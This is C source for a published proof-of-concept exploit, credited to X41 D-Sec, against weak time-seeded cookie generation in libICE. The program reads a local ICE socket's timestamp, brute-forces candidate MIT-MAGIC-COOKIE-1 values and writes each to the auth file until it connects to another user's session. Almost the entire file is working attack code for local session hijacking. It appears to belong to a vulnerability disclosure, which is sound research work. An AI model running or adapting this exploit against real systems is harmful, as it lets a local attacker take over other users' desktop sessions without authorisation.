/*
 2017 - X41 D-Sec GmbH, Eric Sesterhenn
 Not for commercial usage.

 PoC DoS against weak entropy in libice
 Author: Eric Sesterhenn <eric.sesterhenn@x41-dsec.de>

 If libbsd is not available (and therefore no arc4random)
 keys for libice are generated using gettimeofday(), which
 does not provide enough entropy. This allows a local
 attacker to gain access to another users libice session.

 The attacker can get a good estimate of the time used 
 to generate the key by looking at differenct factors
 e.g. uptime, runtime of process or creation of the local
 socket (this is used here).

 This worked for me on debian jessie with gnome3/gdm3 an
 attached to x-session-manager;

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <X11/ICE/ICElib.h>
#include <X11/ICE/ICEmsg.h>
#include <X11/ICE/ICEproto.h>
#include <X11/ICE/ICEutil.h>
#include <stdio.h>

/* get a nice, local connection to brute-force */
char *
getconnection(void) {
	DIR *dirp;
	struct dirent *dp;
	char *ret = NULL;

	dirp = opendir("/tmp/.ICE-unix/");
	if (!dirp)
		return NULL;

	do {
		dp = readdir(dirp);
		if (dp) {
			if (dp->d_name[0] == '.')
				continue;

			asprintf(&ret, "/tmp/.ICE-unix/%s", dp->d_name);
			closedir(dirp);
			return ret;
		}
	} while (dp != NULL);
	closedir(dirp);
}

/* stolen from libice (iceauth.c) */
void 
generateCookie(char *out, long data1, long data2) {
	int i;
	int seed;
	int value;
	int len = 16;
	seed = (data1) + (data2 << 16);
	srand (seed);
	for (i = 0; i < len; i++){
        value = rand ();
		out[i] = value & 0xff;
	}
}

/* get the atime of the local socket */
int
xgettime(char *filename, long *time1, long *time2) {
	struct stat sb;
	struct timespec *t;

	if (stat(filename, &sb) == -1)
		return -1;

	t = (struct timespec *) &sb.st_atime;
	*time1 = t->tv_sec;
	*time2 = t->tv_nsec / 1000;

	return 0;
}

int main(int argc, char **argv) {
	IceConn iceConn;
	IceProtocolSetupStatus setupstats;
	char *ids = NULL;
	int PMopcode;
	int errorLength = 100;
	char *errorStringRet = malloc(100);
	char *vendor = NULL;
	char *release = NULL;
	int majorVersion, minorVersion;
	int _SmcOpcode = 1;
	char *file;
	char authdata[16];
	int i;
	FILE *authFile;
	IceAuthFileEntry auth;
	long time1;
	long time2;

	if (!errorStringRet)
		exit(-1);

	IcePoVersionRec versions[] = {
		{1, 0, NULL}
	};
	int version_count = 1;
	const char *auth_names[] = {"MIT-MAGIC-COOKIE-1"};
	IcePoAuthProc auth_procs[] = {NULL};
	int auth_count = 1;

	PMopcode = IceRegisterForProtocolSetup(
		"XSMP",
		"gnome-session", "3.14.0",
		version_count, versions,
		auth_count, auth_names, auth_procs, NULL);

	if (PMopcode < 0) {
		exit(PMopcode);
	}

	// local/debianxorg:@/tmp/.ICE-unix/801
	file = getconnection();
	if (!file) { perror("couldnt get a connection"); }

	asprintf(&ids, "local/debianxorg:@%s", file);
	if (!ids){ perror("no memory"); }

	/* before we can open the connection, write an auth file */
	xgettime(file, &time1, &time2);

	/* since the file exists longer than the cookie, 
	   we add some buffertime, on my system this is around ~7000 */

	time2 += 5000;

	for (i = 0; i < 5000; i++) {
		generateCookie(authdata, time1, time2);

		auth.protocol_name = "ICE";
		auth.protocol_data = 0;
		auth.protocol_data_length = 0;
		auth.network_id = ids;
		auth.auth_name = "MIT-MAGIC-COOKIE-1";
		auth.auth_data = authdata;
		auth.auth_data_length = 16;

		authFile = fopen(IceAuthFileName(), "w+");
		if (!IceWriteAuthFileEntry(authFile, &auth))
			exit(-1);
		fclose(authFile);
		iceConn = IceOpenConnection(
			ids, NULL, 0, _SmcOpcode, errorLength, errorStringRet);

		if (iceConn) {
			printf("Connection opened\n");
			printf("Using time: %lu %lu\n", time1, time2);
			exit(0);
		}
		time2++;
	}
	free(errorStringRet);
	printf("Failed\n");
	exit(-1);
}
